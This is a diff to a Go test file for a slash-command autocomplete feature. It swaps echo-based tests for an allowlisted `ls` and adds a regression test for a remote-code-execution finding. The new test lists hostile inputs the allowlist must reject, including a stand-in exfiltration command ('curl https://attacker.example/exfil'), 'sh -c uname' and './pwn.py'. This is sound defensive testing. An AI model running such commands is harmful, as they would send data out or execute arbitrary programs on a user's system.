@@ -265,13 +265,22 @@ func TestAutocompleteProvider_NotFound(t *testing.T) {
 	}
 }
 
-// TestAutocompleteProvider_DynamicCommand verifies dynamic autocomplete
+// TestAutocompleteProvider_DynamicCommand verifies dynamic autocomplete.
+// Uses `ls` because the autocomplete allowlist (git/ls/engram) was tightened
+// in response to deepsec-scan-rce-d3cc0dc28a.
 func TestAutocompleteProvider_DynamicCommand(t *testing.T) {
+	tmpDir := testutil.SetupTempDir(t)
+	for _, name := range []string{"file1.txt", "file2.txt", "file3.txt"} {
+		if err := os.WriteFile(filepath.Join(tmpDir, name), []byte("x"), 0644); err != nil {
+			t.Fatalf("write file: %v", err)
+		}
+	}
+
 	cmd := &SlashCommand{
 		Parameters: []Parameter{
 			{
 				Name:         "files",
-				Autocomplete: "echo file1.txt\necho file2.txt\necho file3.txt",
+				Autocomplete: "ls " + tmpDir,
 			},
 		},
 	}
@@ -280,11 +289,26 @@ func TestAutocompleteProvider_DynamicCommand(t *testing.T) {
 	if err != nil {
 		t.Fatalf("AutocompleteProvider() error = %v", err)
 	}
-
-	// Note: This test depends on the echo command being available
-	// It should return the echoed values
 	if len(values) < 1 {
 		t.Errorf("len(values) = %d, want at least 1", len(values))
+	}
+}
+
+// TestExecuteAutocomplete_RejectsNonAllowlistedProgram is a regression test
+// for deepsec-scan-rce-d3cc0dc28a: a slash-command YAML's autocomplete:
+// directive must not be able to invoke arbitrary programs.
+func TestExecuteAutocomplete_RejectsNonAllowlistedProgram(t *testing.T) {
+	for _, cmd := range []string{
+		"curl https://attacker.example/exfil",
+		"/usr/bin/curl",
+		"sh -c uname",
+		"./pwn.py",
+	} {
+		t.Run(cmd, func(t *testing.T) {
+			if _, err := executeAutocomplete(cmd); err == nil {
+				t.Errorf("executeAutocomplete(%q) should have been rejected by the allowlist", cmd)
+			}
+		})
 	}
 }
 
@@ -378,66 +402,52 @@ func TestExecuteAutocomplete_InvalidCommand(t *testing.T) {
 	}
 }
 
-// TestExecuteAutocomplete_ValidCommand verifies successful execution
+// TestExecuteAutocomplete_ValidCommand verifies successful execution of
+// an allowlisted program.
 func TestExecuteAutocomplete_ValidCommand(t *testing.T) {
-	// Use a simple command that should work on all systems
-	values, err := executeAutocomplete("echo test")
+	tmpDir := testutil.SetupTempDir(t)
+	if err := os.WriteFile(filepath.Join(tmpDir, "only.txt"), []byte("x"), 0644); err != nil {
+		t.Fatalf("write file: %v", err)
+	}
+	values, err := executeAutocomplete("ls " + tmpDir)
 	if err != nil {
 		t.Fatalf("executeAutocomplete() error = %v", err)
 	}
-
 	if len(values) != 1 {
 		t.Errorf("len(values) = %d, want 1", len(values))
 	}
-
-	if len(values) > 0 && values[0] != "test" {
-		t.Errorf("values[0] = %q, want %q", values[0], "test")
+	if len(values) > 0 && values[0] != "only.txt" {
+		t.Errorf("values[0] = %q, want %q", values[0], "only.txt")
 	}
 }
 
-// TestExecuteAutocomplete_EmptyOutput verifies handling of empty output
+// TestExecuteAutocomplete_EmptyOutput verifies handling of empty output.
 func TestExecuteAutocomplete_EmptyOutput(t *testing.T) {
-	values, err := executeAutocomplete("echo")
+	tmpDir := testutil.SetupTempDir(t)
+	values, err := executeAutocomplete("ls " + tmpDir)
 	if err != nil {
 		t.Fatalf("executeAutocomplete() error = %v", err)
 	}
-
 	if len(values) != 0 {
 		t.Errorf("len(values) = %d, want 0 for empty output", len(values))
 	}
 }
 
-// TestExecuteAutocomplete_MultilineOutput verifies multiline output parsing
+// TestExecuteAutocomplete_MultilineOutput verifies multiline output parsing.
 func TestExecuteAutocomplete_MultilineOutput(t *testing.T) {
-	// Create a temp script to generate multiline output
 	tmpDir := testutil.SetupTempDir(t)
-	scriptPath := filepath.Join(tmpDir, "test.sh")
-
-	script := `#!/bin/sh
-echo line1
-echo line2
-echo line3
-`
-	if err := os.WriteFile(scriptPath, []byte(script), 0755); err != nil {
-		t.Fatalf("failed to create test script: %v", err)
+	for _, name := range []string{"line1", "line2", "line3"} {
+		if err := os.WriteFile(filepath.Join(tmpDir, name), []byte("x"), 0644); err != nil {
+			t.Fatalf("write file: %v", err)
+		}
 	}
 
-	values, err := executeAutocomplete(scriptPath)
+	values, err := executeAutocomplete("ls " + tmpDir)
 	if err != nil {
 		t.Fatalf("executeAutocomplete() error = %v", err)
 	}
 
 	if len(values) != 3 {
 		t.Errorf("len(values) = %d, want 3", len(values))
-	}
-
-	want := []string{"line1", "line2", "line3"}
-	for i, v := range values {
-		if i >= len(want) {
-			break
-		}
-		if v != want[i] {
-			t.Errorf("values[%d] = %q, want %q", i, v, want[i])
-		}
 	}
 }
